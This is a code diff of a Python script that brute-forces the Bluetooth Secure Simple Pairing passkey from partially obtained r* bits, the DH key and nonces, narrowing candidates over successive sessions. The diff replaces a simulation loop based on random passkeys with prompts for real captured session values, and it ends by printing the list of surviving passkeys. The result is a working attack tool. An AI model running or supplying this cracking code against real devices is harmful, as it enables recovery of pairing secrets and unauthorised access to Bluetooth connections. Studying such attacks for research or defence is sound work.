@@ -4,19 +4,16 @@ from statistics import mean
 start_time = time.time()
 # For simplicity we are using the passkey to generate r* in every session. However, ideally the attacker must input
 # obtained r* bits for every session.
-"""datasets sample 
-PKax = "2c31a47b5779809ef44cb5eaaf5c3e43d5f8faad4a8794cb987e9b03745c78dd"
-PKbx = "f465e43ff23d3f1b9dc7dfc04da8758184dbc966204796eccf0d6cf5e16500cc"
+"""Datasets sample 
+DHkey = "2c31a47b5779809ef44cb5eaaf5c3e43d5f8faad4a8794cb987e9b03745c78dd"
+Na = "356e369e521b0c3b99223ea4ce393024"
+Nb = "3057b5f403616cfa4924ab9e8db98516"
 """
 tmp = 0
 count = 0
-n1 = 2
-ssp = [0] * 50
-
 
 def firstbrute(dhkey, na, nb, passwords):
     # initialising the values obtained in first SSP session with device A.
-    # For our purpose, we are assuming that the attacker has obtained around 7 bits of r* in every SSP session.
     dhkey_bin = str(bin(int(dhkey, 16)))
     na_bin = str(bin(int(na, 16)))
     nb_bin = str(bin(int(nb, 16)))
@@ -29,19 +26,9 @@ def firstbrute(dhkey, na, nb, passwords):
     na_bin = na_bin.zfill(128)
     nb_bin = nb_bin.zfill(128)
     dhkey_bin = dhkey_bin.zfill(256)
-    msg = bytes(na_bin + nb_bin + pas[2:22], "utf-8")
-    key = bytes(dhkey_bin, "utf-8")
-    h = hmac.new(key, msg, hashlib.sha256)
-    hexdat = h.hexdigest()
-    c = str(bin(int(hexdat, 16)))
-    c = c[2:]
-    """
-    print("Enter known r: ")
-    c = str(input())
+    r = input("Enter obtained r*a bits: ")
+    c = list(r)
     n = len(c)
-    """
-    print("Binary 20-bit Passkey: " + pas[2:22].zfill(20))
-    print("Known r*: " + c[:10])
     count = 0
 
     # Brute Force
@@ -58,7 +45,7 @@ def firstbrute(dhkey, na, nb, passwords):
         cb = str(bin(int(hexdat_brute, 16)))
         cb = cb[2:]
         # comparing n1 bits of the r* and bruteforce combination r*
-        if cb[:n1] == c[:n1]:
+        if cb[:n] == c[:n]:
             try:
                 passwords[count] = passbrute
             except:
@@ -72,8 +59,7 @@ def firstbrute(dhkey, na, nb, passwords):
 
 def conbrute(count, dhkey, na, nb, passwords):
     # Initialising the values obtained in the first SSP session with device B and all the following consecutive SSP
-    # sessions performed. For our purpose, we are assuming that the attacker has obtained around 7 bits of r* in
-    # every SSP session.
+    # sessions performed.
     newcount = 0
     dhkey_bin = str(bin(int(dhkey, 16)))
     na_bin = str(bin(int(na, 16)))
@@ -84,21 +70,9 @@ def conbrute(count, dhkey, na, nb, passwords):
     na_bin = na_bin.zfill(128)
     nb_bin = nb_bin.zfill(128)
     dhkey_bin = dhkey_bin.zfill(256)
-    msg = bytes(na_bin + nb_bin + pas[2:22], "utf-8")
-    key = bytes(dhkey_bin, "utf-8")
-    h = hmac.new(key, msg, hashlib.sha256)
-    hexdat = h.hexdigest()
-    c = str(bin(int(hexdat, 16)))
-    c = c[2:]
-    """
-    #Enter known r* 
-    print("Enter known r: ")
-    c = str(input())
+    r = input("Enter obtained r* bits: ")
+    c = list(r)
     n = len(c)
-    """
-    print("Binary 20-bit Passkey: " + pas[2:22].zfill(20))
-    print("Known r*: " + c[:10])
-    i = 0
     # Brute Force Consecutive ssp session
     for i in range(count):
         passbrute = str(passwords[i])
@@ -112,52 +86,39 @@ def conbrute(count, dhkey, na, nb, passwords):
         hexdat_brute = hb.hexdigest()
         cb = str(bin(int(hexdat_brute, 16)))
         cb = cb[2:]
-        # comparing n1 bits of the r* and bruteforce combination r*
-        if cb[:n1] == c[:n1]:
+        # comparing n bits of the r* and brute-force combination br*
+        if cb[:n] == c[:n]:
             passwords[newcount] = passbrute
             newcount = newcount + 1
     return passwords, newcount
 
 
-for x in range(0, 50):
-    count = 0
-    passwords = [0] * 1000000
-    passkey = str(random.randint(1, 1000000))
-    if len(passkey) < 6:
-        passkey = passkey.zfill(6)
-    pas = str(bin(int(passkey)))
-    print("Passkey:" + pas[2:22])
-    print("Decimal passkey: " + str(passkey))
-    # First Brute Force
-    dhkey = binascii.b2a_hex(os.urandom(32))
-    na = binascii.b2a_hex(os.urandom(16))
-    nb = binascii.b2a_hex(os.urandom(16))
-    passwords, count = firstbrute(dhkey, na, nb, passwords)
-    passwords = passwords[:count]
-    tmp = 0.5
+passwords = [0] * 1000000
+# First Brute Force
+dhkey = bytes(input("Enter DHkey: "), 'utf-8')
+na = bytes(input("Enter Na: "), 'utf-8')
+nb = bytes(input("Enter Nb: "), 'utf-8')
+passwords, count = firstbrute(dhkey, na, nb, passwords)
+passwords = passwords[:count]
+tmp = 0.5
 
-    while count != 1:
-        dhkey = binascii.b2a_hex(os.urandom(32))
-        na = binascii.b2a_hex(os.urandom(16))
-        nb = binascii.b2a_hex(os.urandom(16))
-        print("DHKEY: " + str(dhkey))
-        print("na: " + str(na))
-        print("nb: " + str(nb))
-        passwords, count = conbrute(count, dhkey, na, nb, passwords)
-        passwords = passwords[:count]
-        tmp = tmp + 0.5
-        if count == 0:
-            print("DHKEYerror: " + str(dhkey))
-            print("naerr: " + str(na))
-            print("nberr: " + str(nb))
-            break
-        print("No. of Potential Passkeys: " + str(len(passwords)))
 
-    print("Number of SSP sessions required: " + str(tmp))
-    ssp[x] = tmp
-    print("Correct Passkey: " + str(passwords[count - 1]))
+while count != 1:
+     dhkey = bytes(input("Enter DHkey: "), 'utf-8')
+     na = bytes(input("Enter Na: "), 'utf-8')
+     nb = bytes(input("Enter Nb: "), 'utf-8')
+     print("DHKEY: " + str(dhkey))
+     print("na: " + str(na))
+     print("nb: " + str(nb))
+     passwords, count = conbrute(count, dhkey, na, nb, passwords)
+     passwords = passwords[:count]
+     tmp = tmp + 0.5
+     if count == 0:
+         print("DHKEY error: " + str(dhkey))
+         print("na err: " + str(na))
+         print("nb err: " + str(nb))
+         break
+     print("No. of Potential Passkeys: " + str(len(passwords)))
 
-print(ssp)
-print("Total Average: " + str(mean(ssp)))
-print("Known Bits:" + str(n1))
+print("Potential passkey list: " + str(passwords))
 print("--- %s seconds ---" % (time.time() - start_time))
